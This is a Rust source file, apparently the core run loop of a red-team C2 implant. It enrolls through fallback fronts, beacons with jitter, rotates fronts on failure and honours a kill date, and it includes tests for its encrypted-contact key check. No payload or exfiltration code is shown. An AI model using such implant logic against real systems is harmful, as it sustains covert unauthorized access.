use std::sync::{Arc, Mutex};

use crate::enroll::{self, Enrollment};
use crate::handlers::Cadence;
use crate::profile::Profile;
use crate::session::{Attempt, Seal, Session};
use crate::transport::{carriage_for, contact_dial};

/// The run's end states, mapped to process exits.
pub enum Exit {
    /// The artifact's time fuse or the server's permanent answer: stop.
    Terminated(u8),
    /// Nothing answered the enrollment walk.
    NoFront,
}

/// One complete run: enroll once (walking the fronts), then hold contacts
/// against the beacon URLs the same fronts name, reconnecting and walking
/// on failure, until the kill date or a permanent refusal. The nonce floor,
/// the ledger, and the cadence live in the session and survive every
/// reconnect and walk step.
pub fn run(profile: &Profile) -> Exit {
    let keys = enroll::KeyPair::generate();

    // The enrollment walk (architecture.md Sec 8): a transport failure
    // walks to the next front (the credential is unspent against a server
    // that never answered); a definitive refusal ends the run.
    let fronts = profile.enroll_walk();
    let mut enrollment: Option<Enrollment> = None;
    let mut last_error = String::new();
    for url in &fronts {
        match enroll::enroll_any(url, profile, &keys) {
            Ok(done) => {
                enrollment = Some(done);
                break;
            }
            Err(cause)
                if cause.starts_with("enroll transport") || cause.starts_with("enroll read") =>
            {
                last_error = cause;
            }
            Err(refusal) => {
                crate::diag!("{refusal}");
                return Exit::Terminated(1);
            }
        }
    }
    let Some(enrollment) = enrollment else {
        crate::diag!("no enroll front answered ({last_error})");
        return Exit::NoFront;
    };
    crate::diag!(
        "enrolled {} into engagement {}",
        enrollment.implant_id,
        enrollment.engagement_id
    );

    let cadence: Cadence = Arc::new(Mutex::new((profile.sleep_seconds, profile.jitter_seconds)));
    // A profile that names the sealed carriage but bakes a key the parser
    // refuses must fail closed, the same refusal enrollment makes: contacts
    // would otherwise fall back to plaintext and broadcast the implant's
    // identity and capability list in the clear on every cycle.
    let seal = match resolve_seal(profile) {
        Ok(seal) => seal,
        Err(cause) => {
            crate::diag!("{cause}; refusing to contact in the clear");
            return Exit::Terminated(1);
        }
    };
    let mut session = Session::new(
        enrollment.implant_id,
        &profile.verbs,
        cadence,
        enrollment.ca_chain,
        seal,
        profile.kill_date.clone(),
        profile.mode != "stream",
    );

    // Contacts never re-enroll: the artifact's identity is bound, and the
    // walk only crosses fronts. Each front on the enroll walk contributes
    // its contact dial; the carriage is built for the entry the walk points
    // at, so a failed contact advances to the next front's dial and a front
    // that returns is picked up again on the next wrap.
    let walk: Vec<String> = fronts.iter().map(|url| contact_dial(url)).collect();
    let mut index = 0usize;
    let mut failures = 0u32;
    let mut carriage = carriage_for(&walk[0], profile);
    loop {
        if session.kill_date_passed() || profile.kill_date_passed() {
            return Exit::Terminated(0);
        }
        match carriage.attempt(&mut session) {
            Ok(Attempt::Crossed) => failures = 0,
            Ok(Attempt::Refused) => {
                crate::diag!("the server refused the handshake; terminating");
                return Exit::Terminated(0);
            }
            Err(cause) => {
                crate::diag!("contact ended: {cause}");
                failures += 1;
                index = (index + 1) % walk.len();
                carriage = carriage_for(&walk[index], profile);
            }
        }
        session.backoff_sleep(failures);
    }
}

/// Resolves the contact seal a profile carries: none for a plaintext
/// carriage, the parsed pair for a sealed one, and an error for a profile
/// that names the sealed carriage but bakes a key the parser refuses --
/// the run fails closed instead of degrading contacts to plaintext.
fn resolve_seal(profile: &Profile) -> Result<Option<Seal>, &'static str> {
    if profile.contact_envelope != "aesgcm" {
        return Ok(None);
    }
    Seal::parse(&profile.envelope_key)
        .map(Some)
        .ok_or("aesgcm contact envelope baked with no usable key")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile(contact_envelope: &str, envelope_key: &str) -> Profile {
        Profile {
            enroll_url: "https://front.example".into(),
            fallback_enroll_urls: Vec::new(),
            ca_pem: String::new(),
            tls_trust: "pinned".into(),
            kill_date: None,
            sleep_seconds: 30.0,
            jitter_seconds: 10.0,
            mode: "poll".into(),
            enroll_path: "/implants/enroll".into(),
            request_timeout_seconds: 30.0,
            envelope: "none".into(),
            contact_envelope: contact_envelope.into(),
            envelope_key: envelope_key.into(),
            wg_private_key: String::new(),
            wg_server_key: String::new(),
            token: String::new(),
            verbs: Vec::new(),
        }
    }

    #[test]
    fn a_plaintext_carriage_carries_no_seal() {
        let plain = profile("none", "");
        assert!(resolve_seal(&plain).expect("plaintext resolves").is_none());
    }

    #[test]
    fn a_sealed_carriage_parses_its_key() {
        // base64 of 16 key-id bytes plus 32 key bytes, the bake's packed
        // shape.
        let packed: Vec<u8> = (0u8..48).collect();
        use base64::Engine;
        let key = base64::engine::general_purpose::STANDARD.encode(packed);
        let seal = resolve_seal(&profile("aesgcm", &key))
            .expect("a well-formed bake resolves")
            .expect("and carries a seal");
        assert_eq!(seal.key_id.to_vec(), (0u8..16).collect::<Vec<u8>>());
        assert_eq!(seal.key.to_vec(), (16u8..48).collect::<Vec<u8>>());
    }

    #[test]
    fn a_sealed_carriage_with_an_unusable_key_fails_closed() {
        // The bake names aesgcm but the key is not the packed shape: the
        // refusal is loud, never a silent fallback to plaintext contacts.
        let err = match resolve_seal(&profile("aesgcm", "not-base64-key")) {
            Err(cause) => cause,
            Ok(_) => panic!("a malformed baked key must be refused"),
        };
        assert_eq!(err, "aesgcm contact envelope baked with no usable key");
    }
}
